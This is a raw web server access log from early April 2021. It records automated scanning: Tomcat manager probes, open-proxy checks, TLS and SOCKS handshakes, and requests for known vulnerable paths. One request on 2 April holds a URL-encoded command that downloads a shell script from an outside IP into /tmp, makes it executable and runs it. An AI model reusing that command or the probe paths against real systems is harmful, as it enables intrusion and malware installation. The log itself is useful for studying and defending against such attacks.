5.178.86.76 - - [01/Apr/2021:00:02:22 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPINOIEPBPOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.78 - - [01/Apr/2021:00:02:27 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:00:02:32 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:00:02:37 +0000] "\x05\x01\x00" 400 157 "-" "-"
71.6.232.2 - - [01/Apr/2021:00:18:48 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
209.141.62.143 - - [01/Apr/2021:00:40:25 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [01/Apr/2021:00:44:11 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:01:22:00 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.49.42 - - [01/Apr/2021:01:58:30 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:02:05:40 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.56.172 - - [01/Apr/2021:02:45:50 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:03:02:11 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.188.210.227 - - [01/Apr/2021:03:34:47 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.188.210.227 - - [01/Apr/2021:03:35:34 +0000] "\x04\x01\x00P\x05\xBC\xD2\xE3\x00" 400 157 "-" "-"
5.188.210.227 - - [01/Apr/2021:03:36:16 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 1047 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
209.141.62.143 - - [01/Apr/2021:04:42:40 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.17.96.34 - - [01/Apr/2021:04:49:10 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
5.178.86.74 - - [01/Apr/2021:05:48:00 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDPDVJVUOOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.78 - - [01/Apr/2021:05:48:05 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:05:48:10 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:05:48:15 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:06:01:12 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUNUTNUUOOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.74 - - [01/Apr/2021:06:01:17 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:06:01:22 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:06:01:27 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:06:16:56 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
157.245.134.6 - - [01/Apr/2021:06:17:26 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [01/Apr/2021:07:35:02 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
64.62.197.2 - - [01/Apr/2021:08:02:19 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
162.142.125.37 - - [01/Apr/2021:08:13:11 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.37 - - [01/Apr/2021:08:13:12 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.62.143 - - [01/Apr/2021:08:57:44 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [01/Apr/2021:09:47:37 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPUKDYBMIKOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.271"
5.178.86.74 - - [01/Apr/2021:09:47:42 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:09:47:47 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:09:47:52 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:09:49:29 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPONEUUOIKOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
5.178.86.76 - - [01/Apr/2021:09:49:34 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:09:49:39 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:09:49:44 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:10:10:27 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
161.97.102.240 - - [01/Apr/2021:10:25:47 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03)\x08\x8F9\xE8\xDEf\x88_\xD3*;7t\xCCN\xDEV \xF0\x17\x04\xC4rZn_R\xB4Q>\xE4\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
162.142.125.53 - - [01/Apr/2021:10:48:05 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.53 - - [01/Apr/2021:10:48:05 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.62.143 - - [01/Apr/2021:10:52:58 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:11:36:12 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
123.160.221.19 - - [01/Apr/2021:11:57:59 +0000] "\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00" 400 157 "-" "-"
123.160.221.19 - - [01/Apr/2021:12:06:55 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Chrome/54.0 (Windows NT 10.0)"
123.160.221.19 - - [01/Apr/2021:12:06:56 +0000] "GET / HTTP/1.1" 404 1034 "-" "Chrome/54.0 (Windows NT 10.0)"
123.160.221.19 - - [01/Apr/2021:12:06:56 +0000] "GET /favicon.ico HTTP/1.1" 404 1052 "-" "Chrome/54.0 (Windows NT 10.0)"
123.160.221.19 - - [01/Apr/2021:12:06:56 +0000] "HEAD / HTTP/1.1" 404 0 "-" "Chrome/54.0 (Windows NT 10.0)"
172.104.193.53 - - [01/Apr/2021:12:15:11 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
5.178.86.76 - - [01/Apr/2021:12:21:52 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPDPJIRKXKOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.76 - - [01/Apr/2021:12:21:57 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:12:22:02 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [01/Apr/2021:12:22:07 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:12:22:50 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:12:28:01 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPINRIJVIUOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
5.178.86.78 - - [01/Apr/2021:12:28:06 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [01/Apr/2021:12:28:11 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.76 - - [01/Apr/2021:12:28:16 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.56.172 - - [01/Apr/2021:13:07:52 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
128.14.211.190 - - [01/Apr/2021:14:22:46 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 1075 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.62.143 - - [01/Apr/2021:15:30:51 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
88.5.238.31 - - [01/Apr/2021:15:51:05 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 zgrab/0.x"
5.178.86.78 - - [01/Apr/2021:16:26:52 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPNNETRMENOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
5.178.86.74 - - [01/Apr/2021:16:26:57 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.76 - - [01/Apr/2021:16:27:02 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:16:27:07 +0000] "\x05\x01\x00" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:16:40:26 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPBNBOOTBNOKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
5.178.86.76 - - [01/Apr/2021:16:40:30 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
5.178.86.74 - - [01/Apr/2021:16:40:35 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
5.178.86.78 - - [01/Apr/2021:16:40:40 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:17:02:45 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
159.65.151.1 - - [01/Apr/2021:17:41:35 +0000] "HEAD / HTTP/1.0" 404 0 "-" "-"
159.65.151.1 - - [01/Apr/2021:17:41:37 +0000] "GET /system_api.php HTTP/1.1" 404 1056 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:39 +0000] "GET /system_api.php HTTP/1.1" 404 1056 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:41 +0000] "GET /c/version.js HTTP/1.1" 404 1052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:43 +0000] "GET /streaming/clients_live.php HTTP/1.1" 404 1065 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:45 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 1066 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:48 +0000] "GET /client_area/ HTTP/1.1" 404 1053 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:50 +0000] "GET /stalker_portal/c/ HTTP/1.1" 404 1059 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
159.65.151.1 - - [01/Apr/2021:17:41:52 +0000] "GET /stream/rtmp.php HTTP/1.1" 404 1057 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
209.141.62.143 - - [01/Apr/2021:18:44:33 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
89.40.73.232 - - [01/Apr/2021:18:54:34 +0000] "\x16\x03\x03\x00\x99\x01\x00\x00\x95\x03\x03`f\x17DS\xDF<\x0B\x04\xD7+\xA7\xF8\xA1+\xC7\x1D\x97\xD6I\xAD" 400 157 "-" "-"
23.95.222.129 - - [01/Apr/2021:19:30:54 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03\xD8:\xB4\xB2\x1D\xDA\xBD\x16\xA6\xE6v\xD0\x9E{\xE4\x834P\xB1Qx?]\xED7s\x85\xB4\x9B\x94\x1DE\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
209.17.96.10 - - [01/Apr/2021:19:50:00 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [01/Apr/2021:19:57:22 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [01/Apr/2021:21:08:10 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [01/Apr/2021:21:40:58 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.49.42 - - [01/Apr/2021:22:30:00 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
107.151.182.54 - - [01/Apr/2021:22:46:19 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
209.141.62.143 - - [01/Apr/2021:22:59:36 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.49.42 - - [01/Apr/2021:23:19:14 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:00:37:55 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.49.42 - - [02/Apr/2021:00:49:27 +0000] "GET /script HTTP/1.1" 400 157 "-" "-"
209.17.96.42 - - [02/Apr/2021:01:09:51 +0000] "GET / HTTP/1.0" 404 2599 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
167.248.133.53 - - [02/Apr/2021:02:10:08 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
167.248.133.53 - - [02/Apr/2021:02:10:08 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
103.139.44.196 - - [02/Apr/2021:02:10:35 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 157 "-" "-"
128.14.134.134 - - [02/Apr/2021:02:14:03 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.104.242.173 - - [02/Apr/2021:03:58:39 +0000] "\xBA\xABd\xA1EZC\xDBM\x87\xEE^\xFD\xBF\x159 X\xD4>\x12\x98\xC4<\xE0\x13\xCF\x00\xAC\xA09\xD7\x90#8~\x8C\xDE\x9DReF\xBF%1Q\xE0\x9D\x06&g\xBB\x82\x95\x19\xED\x07\x14\x19ZP\x80+\x94e\xC3\xE6\x85\x06\xA4\x99\x8B\x19l\x01\xEA\x88Y\x91\x16\x95\xC4\xC8\x0EH\x02\xC7\x93g\xC14FW\x05|\xFB\xF3T\xB8\xFD\xCB\xBB)\xE3\xCE\xDD\xCD7\x9E\xEFP\x8C\xA4[V\xFD\x98\xC9l\x82\xF5\xE4\xC1d\x87X\xF7\x9B\xBF\xE8q\x12\x99&\xDB,\xF5\x87\xD7\xA8\x97j;\xE3\xEA\xA7\xB4\xB0\x02\xAD\x8DE\x9B\xAAB\x80\x0E)\xA9\xE9\xAF}\x18\x8E\xB8\x1E\x99\x04\xEF\xA8\x8C\xE8\x04\xE2\xD3\xED)1\x91\xC1\x8F\x88\x8C\x81\xF0\xDB\xA5\x88\x95H\x9BZ\xAB\xCE\xBF\xF4E%P*\x88KFY6\x9E\xE7::j\xD4\x8A\xA8V\x9A\xAA\xAB\xAF\xC3&.\xED[\x04\xC5e\x7F\x08\xBE\x8Ar\xA7\xB0\x99F\xF7\x11\xE5\xD6\x96\x8CIm+w\x1C\xFDuU\x14\x0F!x\xAC\xE8MPy\xC3\x19!2\xA0\xED\xC0}!Rw\x14\x8E\x1B\xC4\xE1\xA0\xAF+\xADKk\xC5\xE0\x5Cs\x9C\xBD\xCB" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:04:10:56 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:05:34:00 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
52.174.96.25 - - [02/Apr/2021:06:52:10 +0000] "HEAD / HTTP/1.1" 404 0 "-" "-"
52.174.96.25 - - [02/Apr/2021:06:52:10 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
209.141.62.143 - - [02/Apr/2021:06:54:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
40.113.42.86 - - [02/Apr/2021:07:00:12 +0000] "GET http://proxyjudge.info/ HTTP/1.1" 404 2600 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
40.113.42.86 - - [02/Apr/2021:07:05:17 +0000] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
51.210.166.116 - - [02/Apr/2021:07:33:35 +0000] "GET /shell?cd%20%2Ftmp%3Bwget%20http%3A%2F%2F45.144.225.27%2Fbin.sh%3Bchmod%20777%20bin.sh%3B.%2Fbin.sh%3Bwget%20https%3A%2F%2Fiplogger.org%2F2lKVw3 HTTP/1.1" 404 1127 "-" "python-requests/2.25.1"
209.141.62.143 - - [02/Apr/2021:07:42:51 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
74.82.47.2 - - [02/Apr/2021:07:57:25 +0000] "GET / HTTP/1.1" 404 2596 "-" "-"
209.141.62.143 - - [02/Apr/2021:08:28:40 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:09:28:06 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
140.238.50.190 - - [02/Apr/2021:12:40:29 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03x>\xE39\xFA\xFEI3\x9F\x84\x1Ch\x10\x11\xC8+\xA8\xB1oM:\xD8\xE1\x15\x8B\xA8\xA3q\x02\xE6\x86\x9E \xC2}k\xBE\x12\xA7\xFA\xF5J\xDD|\xF7H\x9B\x04\xA2\x8D\x85\xC9B\xD3a\x9EK\x8F\xBAH:\xBE\xF1k[\x002\x13\x02\x13\x03\x13\x01\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9E\xCC\xAA\xC0#\xC0'\xC0\x09\xC0\x13\xC0" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:13:31:57 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:15:24:23 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
162.142.125.54 - - [02/Apr/2021:15:27:52 +0000] "GET / HTTP/1.1" 404 2601 "-" "-"
162.142.125.54 - - [02/Apr/2021:15:27:52 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.56.172 - - [02/Apr/2021:15:36:10 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
192.35.168.176 - - [02/Apr/2021:15:38:51 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0 zgrab/0.x"
40.113.42.86 - - [02/Apr/2021:16:29:27 +0000] "CONNECT google.com:443 HTTP/1.1" 400 157 "-" "-"
205.185.122.102 - - [02/Apr/2021:16:53:03 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.62.143 - - [02/Apr/2021:16:58:27 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
109.234.153.133 - - [02/Apr/2021:17:53:43 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPXOETOVUUDKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
109.234.153.130 - - [02/Apr/2021:17:53:48 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [02/Apr/2021:17:53:52 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.134 - - [02/Apr/2021:17:53:58 +0000] "\x05\x01\x00" 400 157 "-" "-"
109.234.153.134 - - [02/Apr/2021:17:54:14 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPOIUPBVUUDKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
109.234.153.134 - - [02/Apr/2021:17:54:19 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
109.234.153.134 - - [02/Apr/2021:17:54:24 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
109.234.153.133 - - [02/Apr/2021:17:54:29 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:18:34:10 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
139.162.79.87 - - [02/Apr/2021:19:52:43 +0000] "GET / HTTP/1.1" 404 1034 "-" "Mozilla/5.0"
205.185.127.244 - - [02/Apr/2021:19:54:25 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1060 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
23.95.222.129 - - [02/Apr/2021:20:02:13 +0000] "\x16\x03\x01\x01\xFA\x01\x00\x01\xF6\x03\x03\x881\x02wLrQC\xBBsh_b\x08\xCE\xD20\x19\xC5~\xA0\xEA#\x00\x13\x05O\x8CN\x8DF\x12\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:20:09:25 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
192.241.226.84 - - [02/Apr/2021:20:39:31 +0000] "GET /manager/html HTTP/1.1" 404 1051 "-" "Mozilla/5.0 zgrab/0.x"
85.119.151.251 - - [02/Apr/2021:20:51:58 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIIIKRKUNDKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
85.119.151.252 - - [02/Apr/2021:20:52:03 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.251 - - [02/Apr/2021:20:52:08 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.252 - - [02/Apr/2021:20:52:13 +0000] "\x05\x01\x00" 400 157 "-" "-"
85.119.151.250 - - [02/Apr/2021:20:52:42 +0000] "POST http://check.best-proxies.ru/azenv.php?s=VJVJVBMOOOYOOIVCPIIIIUKUNDKRYR HTTP/1.1" 404 2685 "https://best-proxies.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.234 (Edition Yx GX)"
85.119.151.251 - - [02/Apr/2021:20:52:46 +0000] "CONNECT 5.178.86.76:80 HTTP/1.1" 400 157 "-" "-"
85.119.151.252 - - [02/Apr/2021:20:52:51 +0000] "\x04\x01\x00P\x05\xB2VL0\x00" 400 157 "-" "-"
85.119.151.253 - - [02/Apr/2021:20:52:56 +0000] "\x05\x01\x00" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:20:55:41 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
209.17.96.106 - - [02/Apr/2021:21:35:23 +0000] "GET / HTTP/1.1" 404 2601 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.141.62.143 - - [02/Apr/2021:21:45:33 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
18.220.116.237 - - [02/Apr/2021:22:36:07 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x86\x93\x8BL\xEE\xC3\xA3\x97\xBF\x08Z+0\xF2\xF8)\x13Y7\xE90\xBC\xAE\x12=\x92=w^\xC1\xB1\x1B tx\x19\xB1\x94\x94L\xA1\xA9\x1C\x0B\x02\xE0\xBD?\xC0\xCFtyV\xDD'!\x83<:\xDD\xB6c\xD7\xA7\x9D\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
209.141.62.143 - - [02/Apr/2021:22:42:03 +0000] "GET /manager/html HTTP/1.1" 400 157 "-" "-"
